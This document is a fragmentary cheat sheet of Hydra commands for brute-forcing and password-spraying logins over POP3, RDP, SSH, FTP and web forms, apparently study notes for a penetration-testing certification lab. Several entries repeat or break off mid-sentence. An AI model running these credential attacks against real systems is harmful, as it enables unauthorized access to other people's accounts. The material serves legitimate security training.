# Hydra

% hydra, bruteforce, cpts

## Hydra - Hydra - Hydra - Hydra - passwords-attack
#cat/ATTACK/BRUTEFORCE-SPRAY #cpts
Hydra

```
hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
```

## Hydra - Hydra - Hydra - Hydra - passwords-attack-2
#cat/ATTACK/BRUTEFORCE-SPRAY #cpts
Hydra

```
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-04-13 11:37:46
```

## Hydra - Hydra - Hydra - Hydra - bruteforce
#cat/ATTACK/BRUTEFORCE-SPRAY #cpts
```
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```

## Hydra - Hydra - Hydra - Hydra - hydra---rdp-password-spraying
#cat/ATTACK/BRUTEFORCE-SPRAY #cpts
Attacking RDP

```
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-08-25 21:44:52
```

## Hydra - Hydra - Hydra - Hydra - hydra---rdp-password-spraying-2
#cat/ATTACK/BRUTEFORCE-SPRAY #cpts
Attacking RDP

```
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-08-25 21:44:56
```

## Hydra - Hydra - Hydra - Hydra - installation
#cat/ATTACK/BRUTEFORCE-SPRAY #cpts
Hydra often comes pre-installed on popular penetration testing distributions. You can verify its presence by running:

```
hydra -h
```

## Hydra - Hydra - Hydra - Hydra - installation-2
#cat/ATTACK/BRUTEFORCE-SPRAY #cpts
If Hydra is not installed or you are using a different Linux distribution, you can install it from the package repository:

```
sudo apt-get -y update
```

## Hydra - Hydra - Hydra - Hydra - installation-3
#cat/ATTACK/BRUTEFORCE-SPRAY #cpts
If Hydra is not installed or you are using a different Linux distribution, you can install it from the package repository:

```
sudo apt-get -y install hydra
```

## Hydra - Hydra - Hydra - Hydra - basic-usage
#cat/ATTACK/BRUTEFORCE-SPRAY #cpts
Hydra's basic syntax is:

```
hydra [login_options] [password_options] [attack_options] [service_options]
```

## Hydra - Hydra - Hydra - Hydra - brute-forcing-http-authentication
#cat/ATTACK/BRUTEFORCE-SPRAY #cpts
Imagine you're tasked with testing the security of a website using basic HTTP authentication at `www.example.com`. You have a list of potential usernames stored in `usernames.txt` and corresponding passwords in `password

```
hydra -L usernames.txt -P passwords.txt www.example.com http-get
```

## Hydra - Hydra - Hydra - Hydra - targeting-multiple-ssh-servers
#cat/ATTACK/BRUTEFORCE-SPRAY #cpts
Consider a situation where you have identified several servers that may be vulnerable to SSH brute-force attacks. You compile their IP addresses into a file named `targets.txt` and know that these servers might use the d

```
hydra -l root -p toor -M targets.txt ssh
```

## Hydra - Hydra - Hydra - Hydra - testing-ftp-credentials-on-a-non-standard-port
#cat/ATTACK/BRUTEFORCE-SPRAY #cpts
Imagine you need to assess the security of an FTP server hosted at `ftp.example.com`, which operates on a non-standard port `2121`. You have lists of potential usernames and passwords stored in `usernames.txt` and `passw

```
hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp
```

## Hydra - Hydra - Hydra - Hydra - brute-forcing-a-web-login-form
#cat/ATTACK/BRUTEFORCE-SPRAY #cpts
Suppose you are tasked with brute-forcing a login form on a web application at `www.example.com`. You know the username is "admin," and the form parameters for the login are `user=^USER^&pass=^PASS^`. To perform this att

```
hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"` #:F=Invalid credentials pour check avec les erreurs
```

## Hydra - Hydra - Hydra - Hydra - advanced-rdp-brute-forcing
#cat/ATTACK/BRUTEFORCE-SPRAY #cpts
Now, imagine you're testing a Remote Desktop Protocol (RDP) service on a server with IP `192.168.1.100`. You suspect the username is "administrator," and that the password consists of 6 to 8 characters, including lowerca

```
hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp
```

## Hydra - Hydra - Hydra - Hydra - cupp
#cat/ATTACK/BRUTEFORCE-SPRAY #cpts
This command efficiently filters `jane.txt` to match the provided policy, from ~46000 passwords to a possible ~7900. It first ensures a minimum length of 6 characters, then checks for at least one uppercase letter, one l

```
hydra -L jane_smith_usernames.txt -P jane-filtered.txt IP -s PORT -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
```

## Hydra - Hydra - Hydra - Hydra - cupp-2
#cat/ATTACK/BRUTEFORCE-SPRAY #cpts
This command efficiently filters `jane.txt` to match the provided policy, from ~46000 passwords to a possible ~7900. It first ensures a minimum length of 6 characters, then checks for at least one uppercase letter, one l

```
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-05 11:47:14
```

## Hydra - Hydra - Hydra - Hydra - cupp-3
#cat/ATTACK/BRUTEFORCE-SPRAY #cpts
This command efficiently filters `jane.txt` to match the provided policy, from ~46000 passwords to a possible ~7900. It first ensures a minimum length of 6 characters, then checks for at least one uppercase letter, one l

```
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-05 11:47:18
```

## Hydra - Hydra - Hydra - Hydra - use-the-command-injection-vulnerability-to-find-a-flag-in-the-web-root
#cat/ATTACK/BRUTEFORCE-SPRAY #cpts
When navigating to `http://monitoring.inlanefreight.local`, students will be redirected to `login.php`, which is a login form with a username and password fields: Students need to bruteforce the password of the "admin" u

```
hydra -l admin -P /usr/share/SecLists/Passwords/darkweb2017-top100.txt "http-post-form://monitoring.inlanefreight.local/login.php:username=admin&password=^PASS^:Invalid Credentials!"
```

## Hydra - Hydra - Hydra - Hydra - use-the-command-injection-vulnerability-to-find-a-flag-in-the-web-root-2
#cat/ATTACK/BRUTEFORCE-SPRAY #cpts
```
└──╼ [★]$ hydra -l admin -P /usr/share/SecLists/Passwords/darkweb2017-top100.txt "http-post-form://monitoring.inlanefreight.local/login.php:username=admin&password=^PASS^:Invalid Credentials!"
```

## Hydra - Hydra - Hydra - Hydra - use-the-command-injection-vulnerability-to-find-a-flag-in-the-web-root-3
#cat/ATTACK/BRUTEFORCE-SPRAY #cpts
```
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-15 09:25:45
```

